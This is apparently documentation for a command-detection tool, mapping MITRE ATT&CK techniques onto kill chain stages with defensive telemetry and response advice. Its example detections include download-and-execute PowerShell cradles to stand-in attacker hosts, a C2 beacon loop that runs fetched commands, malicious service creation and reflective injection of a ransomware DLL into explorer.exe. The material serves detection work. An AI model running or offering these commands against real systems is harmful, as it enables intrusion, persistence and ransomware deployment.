# Cyber Kill Chain Mapping - OD-Translator Detection Coverage

This document maps the detection techniques implemented in the Offensive-Defensive Translator to the **MITRE ATT&CK Cyber Kill Chain**, showing how the tool identifies malicious commands at different stages of an attack.

## Overview: Lockheed Martin Cyber Kill Chain

The cyber kill chain breaks attacks into 7 sequential phases:

1. **Reconnaissance** — Gather information about target
2. **Weaponization** — Develop exploit/payload
3. **Delivery** — Transmit payload to target
4. **Exploitation** — Execute exploit/payload
5. **Installation** — Establish persistence mechanism
6. **Command & Control (C2)** — Remote control of compromised system
7. **Actions on Objectives** — Achieve attacker's goals

---

## Detection Coverage by Kill Chain Stage

### Stage 1-2: Reconnaissance & Weaponization
**ODT provides limited coverage** — These stages typically occur offline or pre-compromise (no command execution yet).

---

### Stage 3: Delivery

#### T1105 — Ingress Tool Transfer
**Purpose**: Download malware, tools, or payloads to the compromised system.

**Detected Patterns:**
- PowerShell file transfer: `DownloadFile()`, `DownloadString()`, `Invoke-WebRequest`, `Invoke-RestMethod`
- LOLBin utilities: `certutil -urlcache`, `bitsadmin /transfer`, `curl`, `wget`, `tftp`, `ftp`
- COM objects: `XMLHTTP`, `WinHttp.WinHttpRequest`, `ServerXMLHTTP`

**Kill Chain Flow:**
```
Attacker → Internet → Download Command → Target Downloads Payload
                      (T1105 detected here)
```

**Example Detection:**
```bash
powershell -c (New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')
→ Technique: T1105 (Ingress Tool Transfer)
→ Confidence: 0.8+ (high — clear download intent)
```

**Defense Strategy:**
- Monitor network outbound connections
- Block known malicious domains at firewall/DNS level
- Alert on suspicious file transfer via LOLBins
- Inspect task scheduler for scheduled downloads

---

### Stage 4: Exploitation

#### T1059 — Command and Scripting Interpreter
**Purpose**: Execute code directly on the system.

**Detected Patterns:**
- PowerShell command execution: `-c`, `-Command`, `-NonInteractive`, `-NoProfile`
- CMD.exe usage: `cmd.exe /c`, `cmd.exe /k`
- Script interpreters: `cscript.exe`, `wscript.exe`, `VBScript`
- JavaScript execution: `mshta.exe` with JavaScript payloads

**Kill Chain Flow:**
```
Attacker → Execution Code → Command Interpreter → System Command Executed
                            (T1059 detected here)
```

**Example Detection:**
```powershell
powershell -nop -c $client=New-Object System.Net.WebClient; $client.DownloadString('http://evil.com/loader.ps1') | IEX
→ Technique: T1059 (Command and Scripting Interpreter - T1059.001 PowerShell)
→ Confidence: 0.9 (very high — multiple suspicious indicators)
```

**Defense Strategy:**
- Enable PowerShell Script Block Logging
- Restrict PowerShell execution via AppLocker/WDAC
- Monitor command-line arguments for suspicious patterns
- Disable mshta.exe if not required

---

#### T1218 — System Binary Proxy Execution (Living Off the Land)
**Purpose**: Use trusted Windows binaries to achieve code execution, evading detection.

**Detected Patterns:**
- mshta.exe: Script protocol execution (`mshta vbscript:...`, `mshta javascript:...`)
- rundll32.exe: DLL function execution
- regsvcs.exe: Registry Services execution
- Script protocol handlers: `.vbs:`, `.js:` protocols

**Kill Chain Flow:**
```
Attacker → Malicious Code → Trusted Binary → System Code Execution
                            (T1218 detected here)
```

**Example Detection:**
```cmd
mshta vbscript:CreateObject("WScript.Shell").Run(cmd,0)(window.close)
→ Technique: T1218 (System Binary Proxy Execution - T1218.005 mshta)
→ Confidence: 0.88 (very high — suspicious vbscript protocol use)
```

**Defense Strategy:**
- Disable unused proxy executables (mshta, rundll32 if possible)
- Monitor for script protocol execution
- Alert on mshta.exe with script protocols
- Implement WDAC policies restricting LOLBin usage

---

### Stage 5: Installation (Persistence)

#### T1543 — Create or Modify System Process
**Purpose**: Establish persistent backdoor through system services.

**Detected Patterns:**
- Windows Service creation: `New-Service`, `sc.exe create`
- Service modification: Registry `HKLM:\System\CurrentControlSet\Services\`
- Launch daemon (macOS): `launchd` plist files
- Systemd (Linux): Unit file creation

**Kill Chain Flow:**
```
Attacker → Install Backdoor → Service/Daemon Registry → Auto-Start Backdoor on Reboot
                              (T1543 detected here)
```

**Example Detection:**
```powershell
powershell -c $svcPath='C:\Temp\svc.exe'; New-Service -Name WindowsUpdate -BinaryPathName $svcPath -StartupType Automatic
→ Technique: T1543 (Create or Modify System Process - T1543.003 Windows Service)
→ Confidence: 0.63 (medium-high — New-Service detected, check binary path)
```

**Activity Telemetry:**
- **Windows Event ID 4697**: "A service was installed on the system"
- **Sysmon Event ID 1**: Process executed (sc.exe, powershell.exe with New-Service)
- **Registry Auditing**: Changes to `HKLM:\System\CurrentControlSet\Services\`

**Defense Strategy:**
- Monitor Windows Event ID 4697 for service installations
- Alert on suspicious service binary paths (cmd.exe, powershell.exe, rundll32.exe)
- Audit registry changes to service keys
- Compare running services against baseline
- Enable Sysmon for detailed process execution tracking

---

### Stage 6: Command & Control (C2)

#### T1071 — Application Layer Protocol
**Purpose**: Establish communication channel with attacker's C2 server.

**Detected Patterns:**
- HTTP/HTTPS URLs: Web-based C2 beaconing
- Suspicious domains: Newly registered domains, suspicious TLDs (`.tk`, `.ml`, `.xyz`)
- Network objects: `WebClient`, `XMLHTTP`, `WinHttp.WinHttpRequest`
- Encoded communications: Base64-encoded HTTP payloads

**Kill Chain Flow:**
```
Attacker C2 ← Network Communication ← Compromised System
                 (T1071 detected here)
```

**Example Detection:**
```powershell
powershell -c $wc=New-Object System.Net.WebClient; while($true) { $wc.DownloadString('http://192.168.1.100:8080/api/cmd'); Start-Sleep 60 }
→ Technique: T1071 (Application Layer Protocol - T1071.001 Web Protocols)
→ Confidence: 0.75+ (medium-high — clear C2 communication pattern)
```

**Activity Telemetry:**
- **Network logs**: Outbound HTTP/HTTPS to unusual destinations
- **Proxy logs**: HTTP POST/GET activity to suspicious domains
- **DNS logs**: Lookups for newly registered domains
- **PowerShell logs**: WebClient / Invoke-WebRequest usage

**Defense Strategy:**
- Monitor outbound network connections for anomalies
- Block suspicious TLDs and newly registered domains
- Inspect proxied traffic for C2 indicators
- Baseline expected internal C2 tools
- Alert on WebClient / XMLHTTP usage

---

### Stage 7: Actions on Objectives (Post-Exploitation Techniques)

#### T1055 — Process Injection
**Purpose**: Inject malicious code into running processes to evade detection and escalate privileges.

**Detected Patterns:**
- CreateRemoteThread API: `CreateRemoteThread`, `OpenProcess`, `ReadProcessMemory`, `WriteProcessMemory`
- Reflective PE injection: `Invoke-ReflectivePEInjection` PowerShell cmdlets
- DLL injection: `LoadLibrary`, `GetProcAddress` chains
- Process hollowing: `CreateProcess` with `SUSPENDED` flag + `WriteProcessMemory`
- High-value targets: explorer.exe, svchost.exe, lsass.exe injection

**Kill Chain Flow:**
```
Attacker Code → Process Memory → Running Process → Elevated Privilege OR Evasion
           (T1055 detected here)
```

**Example Detection:**
```powershell
powershell -nop -c Invoke-ReflectivePEInjection -PEPath C:\Temp\beacon.dll -Target explorer.exe
→ Technique: T1055 (Process Injection - T1055.002 PE Injection)
→ Confidence: 0.69 (medium-high — direct PE injection pattern)
```

**Other Examples:**

**DLL Injection:**
```powershell
powershell -c $pp=Get-Process explorer; [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('beacon.dll')) | % { 
    $kernel32 = @"...CreateRemoteThread..."@ }
→ Technique: T1055 (Process Injection - T1055.001 DLL Injection)
```

**Process Hollowing:**
```powershell
[Diagnostics.Process]::Start('svchost.exe', '', [Diagnostics.ProcessWindowStyle]::Hidden) | % {
    # CreateProcess SUSPENDED → WriteProcessMemory malicious code
}
→ Technique: T1055 (Process Injection - T1055.012 Process Hollowing)
```

**Activity Telemetry:**
- **Sysmon Event ID 8**: CreateRemoteThread detected
- **Sysmon Event ID 1**: Parent-child process anomalies (explorer spawning rundll32, etc.)
- **ETW**: Microsoft-Windows-Threat-Intelligence for process injection
- **Memory forensics**: Suspicious code in process memory
- **API hooking**: CreateRemoteThread, VirtualAllocEx, WriteProcessMemory

**Defense Strategy:**
- Monitor Sysmon Event ID 8 (CreateRemoteThread)
- Alert on CreateRemoteThread to high-value processes
- Baseline legitimate explorer/svchost behavior
- Implement code integrity checks (EMET, CFG)
- Use memory scanning tools to detect injected code
- Enable ETW Process Injection monitoring in Windows Event logs

---

## Attack Scenario: Multi-Stage Kill Chain Detection

### Scenario: Ransomware Deployment

**Stage 1-2: Reconnaissance & Weaponization** (offline, not detected)

**Stage 3: Delivery**
```powershell
powershell -c (New-Object System.Net.WebClient).DownloadString('http://malicious.tk/loader.ps1') | IEX
→ Detection: T1105 (Ingress Tool Transfer) — 0.8 confidence
→ IOC: Download of suspicious script from unusual TLD
```

**Stage 4: Exploitation**
```powershell
IEX (Get-Content C:\Temp\loader.ps1)
→ Detection: T1059 (Command and Scripting Interpreter) — 0.85 confidence
→ IOC: Script execution via IEX (Invoke-Expression)
```

**Stage 5: Installation**
```powershell
New-Service -Name RansomService -BinaryPathName 'C:\Temp\service.exe' -StartupType Automatic | Start-Service
→ Detection: T1543 (Create or Modify System Process) — 0.63 confidence
→ IOC: Suspicious service creation with temp directory binary
```

**Stage 6: Command & Control**
```powershell
while($true) { 
    $result = (New-Object Net.WebClient).DownloadString('http://192.168.1.50:8080/cmd')
    Invoke-Expression $result
    Start-Sleep 60
}
→ Detection: T1071 (Application Layer Protocol) — 0.75 confidence
→ IOCs: Internal IP C2, suspicious beaconing pattern
```

**Stage 7: Actions on Objectives**
```powershell
Invoke-ReflectivePEInjection -PEPath C:\Temp\ransomware.dll -Target explorer.exe
→ Detection: T1055 (Process Injection) — 0.69 confidence
→ IOC: PE injection into explorer.exe (privilege escalation/evasion)

# Ransomware payload now runs as explorer.exe
```

### Detection Summary:
| Stage | Technique | Confidence | Action |
|-------|-----------|------------|--------|
| Delivery | T1105 | 0.80 | ALERT: Suspicious download detected |
| Exploitation | T1059 | 0.85 | ALERT: Script execution via IEX |
| Installation | T1543 | 0.63 | ALERT: Suspicious service creation |
| C2 | T1071 | 0.75 | ALERT: Suspicious C2 communication |
| Post-Exploit | T1055 | 0.69 | ALERT: Process injection detected |

**Defense Action**: Block service execution, kill explorer.exe, quarantine C:\Temp\*, block C2 IP at firewall.

---

## Using OD-Translator for Kill Chain Analysis

### 1. Identify Attack Stage
When you receive a suspicious command, run it through ODT:

```bash
python -m src.cli.main --include-secondary-techniques 'powershell -c (New-Object Net.WebClient).DownloadString(...)'
```

The detected technique(s) and confidence scores tell you which kill chain stage the attacker is at.

### 2. Map to Telemetry
Use the `telemetry_sources` in the output to hunt for related events:

- **T1105**: Look for network logs, TLS handshakes, DNS queries
- **T1059**: Search PowerShell event logs, command-line auditing
- **T1218**: Find mshta.exe execution, script protocol usage
- **T1543**: Query Windows Event ID 4697, registry modifications
- **T1071**: Analyze network flows, proxy logs, DNS
- **T1055**: Review Sysmon Event ID 8, memory dumps

### 3. Build Detection Rules
Understanding kill chain stage helps prioritize rules:

- **Early stage (Delivery/Exploitation)**: HIGH confidence baseline (0.7+)
- **Installation stage**: Medium confidence acceptable (0.6+) — Persistence is auditable
- **C2 stage**: Monitor baseline behavior, anomaly detection on communication patterns
- **Post-Exploit**: Alert on high-value process injection immediately

### 4. Correlate Across Stages
A single command may trigger multiple techniques:

```powershell
# This command hits BOTH T1105 (download) and T1059 (execution)
powershell -c (New-Object Net.WebClient).DownloadString('http://attacker.com/tool.ps1') | IEX
```

Seeing multiple techniques in sequence = **higher confidence** the activity is malicious.

---

## Defensive Posture by Kill Chain Stage

| Stage | Detection Focus | Response Priority |
|-------|-----------------|-------------------|
| **Delivery** | Monitor downloads, block suspicious TLDs | **CRITICAL** — Stop payload delivery |
| **Exploitation** | Alert on script execution, command patterns | **CRITICAL** — Prevent code execution |
| **Installation** | Watch service creation, startup modifications | **HIGH** — Stop persistence |
| **C2** | Block outbound connections, disrupt communication | **HIGH** — Isolate compromised system |
| **Actions on Objectives** | Detect privilege escalation, lateral movement | **MEDIUM** — Limit damage already done |

---

## Summary

The Offensive-Defensive Translator identifies commands at multiple kill chain stages:

- **🎯 Delivery**: T1105 (tool/malware download)
- **⚡ Exploitation**: T1059, T1218 (code execution via interpreters/proxies)
- **🔐 Installation**: T1543 (persistence via services)
- **📡 C2**: T1071 (communication with attacker)
- **💉 Actions on Objectives**: T1055 (privilege escalation/evasion via injection)

By understanding which kill chain stage each detection represents, analysts can:
1. **Prioritize responses** (stop delivery before installation)
2. **Correlate events** (find related artifacts across logs)
3. **Hunt effectively** (know where to look for supporting evidence)
4. **Measure security posture** (coverage gaps in kill chain)

For more information on the detected techniques, see [sample_commands.md](../sample_commands.md) for realistic attack examples.
